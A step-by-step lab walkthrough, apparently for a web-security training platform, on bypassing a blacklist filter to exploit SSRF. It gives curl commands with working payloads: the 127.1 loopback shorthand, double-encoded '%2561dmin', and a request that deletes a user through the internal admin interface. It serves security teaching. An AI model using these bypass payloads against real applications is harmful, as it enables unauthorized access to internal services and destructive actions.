# Walkthrough: SSRF with Blacklist-Based Input Filter

> Replace `<LAB-ID>` and `<SESSION>` with your own lab instance values throughout.

## 1. Capture the real request structure

Don't assume the body format from a different lab instance — capture it fresh:

1. Open a product page → DevTools → **Network** tab → filter **Fetch/XHR**
2. Click **"Check stock"**
3. Copy the exact request body from the **Payload** tab

A critical detail easy to get wrong: if the internal URL in `stockApi` has its own query string (e.g. `?productId=1&storeId=1`), that query string must **not** be left unencoded inside a `stockApi=...` value sent as `application/x-www-form-urlencoded` — the unescaped `&` will be parsed as the start of a *new* top-level form field, truncating your intended URL. Confirm the real body is structured as separate top-level fields:
```
stockApi=http://<internal-host>:<port>/product/stock/check&productId=1&storeId=1
```

## 2. Establish two baseline response signatures

Before testing bypasses, send two reference requests so you can classify every later response:

```bash
# Expected: blocked by the filter
--data-raw 'stockApi=http://localhost/admin'

# Expected: passes the filter, fails for an unrelated reason (e.g. unresolvable host)
--data-raw 'stockApi=http://this-domain-doesnt-exist/admin'
```

Compare status codes, response bodies, and content-length. A **generic filter-rejection message** (same text, same length, regardless of what you send) is your "blocked" signature. Anything else — a different error, a 500, or a real response — tells you the request got past that specific check.

> **Common pitfall:** A misspelled `Content-Type` header (`application/x-www-urlencoded` instead of `application/x-www-form-urlencoded`) may still be parsed leniently by some apps, producing misleading results. Double-check this header is exact before drawing conclusions from a test.

## 3. Bypass defense 1 — the host filter

Test alternate representations of the loopback address one at a time:

```bash
curl -v https://<LAB-ID>.web-security-academy.net/product/stock \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -b 'session=<SESSION>' \
  --data-raw 'stockApi=http://127.1:8080/product/stock/check&productId=1&storeId=1'
```

If this returns a **different** error than the "blocked" baseline — e.g. `500 Internal Server Error: "Could not connect to external stock check service"` — the host filter has been bypassed. A 500 here means the request was *attempted*, just unsuccessfully (likely because nothing meaningful sits at that exact host:port:path combination) — that's a sign of progress, not failure.

`127.1` works because it's shorthand that most URL parsers still resolve to `127.0.0.1`, but as a literal string it doesn't match a filter looking for `localhost` or the full four-octet form.

## 4. Bypass defense 2 — the path filter

Once the host passes, try the actual target path:
```
stockApi=http://127.1:8080/admin
```
If this reverts to the generic "blocked" response **despite the host now being allowed**, a second filter is catching the literal substring `admin` in the path. The fact that identical hosts produce different outcomes depending only on the path is the tell.

**First attempt — single percent-encoding:**
```
stockApi=http://127.1:8080/%61dmin
```
If this is *still* blocked, the filter is checking an already-decoded value (`%61` → `a` → `admin` detected).

**Second attempt — double percent-encoding:**
```
stockApi=http://127.1/%2561dmin
```
This exploits a common architectural quirk: the validation layer decodes the value **once** when checking it (`%2561` → `%61`, which is not the literal string `admin`, so it passes), while the HTTP client that actually dispatches the request decodes **again** during its own URL normalization (`%61` → `a`), reconstructing `/admin` only after the filter has already approved the request.

> **Port note:** drop `:8080` once targeting `/admin` — that port belongs to the separate stock-check service. The admin interface runs on the host's default port.

## 5. Confirm and extract the delete-user link

```bash
curl -s https://<LAB-ID>.web-security-academy.net/product/stock \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -b 'session=<SESSION>' \
  --data-raw 'stockApi=http://127.1/%2561dmin' \
  | grep -o 'href="[^"]*carlos[^"]*"'
```

## 6. Trigger the delete

Apply the same encoding to `admin` in the delete path too, since it passes through the same filter:
```bash
curl -s https://<LAB-ID>.web-security-academy.net/product/stock \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -b 'session=<SESSION>' \
  --data-raw 'stockApi=http://127.1/%2561dmin/delete?username=carlos'
```

## 7. Verify

Refresh the lab page — status should flip to **"Solved."**

---

## Key takeaways

- **A blacklist only blocks patterns its author thought of.** Any value that reaches the same destination through an unanticipated representation sails through untouched.
- **Validation and execution often use different URL-decoding logic**, even within the same application. When a validation layer and the layer that actually performs an action disagree on how many times to decode a value, that mismatch is itself an exploitable gap — this is the general principle behind the double-encoding bypass, not a trick specific to this one lab.
- **Identical error messages can hide multiple distinct filters.** Don't assume one generic "blocked" response means one check — vary a single input at a time and watch for *any* change in the response, including completely different error types (e.g. 500 vs 400), to tell how many independent checks you're actually up against.
- **A 500 or unexpected error during bypass testing is often progress, not failure.** It frequently means a filter was bypassed and the request was genuinely attempted, just unsuccessfully for an unrelated reason (wrong port, wrong path, nothing listening).

## Related labs

| Lab | What's different |
|---|---|
| SSRF with whitelist-based input filter | Filter validates the host against an allowlist rather than blocking known-bad patterns — requires a different bypass strategy entirely (e.g. open redirects, the `@` URL trick) |
| SSRF with filter bypass via open redirection | Combines an allowlist-style restriction with a separate open-redirect vulnerability elsewhere in the app to reach a disallowed host |
| Blind SSRF with out-of-band detection | No response body returned — requires an external listener (Burp Collaborator) to confirm the request fired at all |
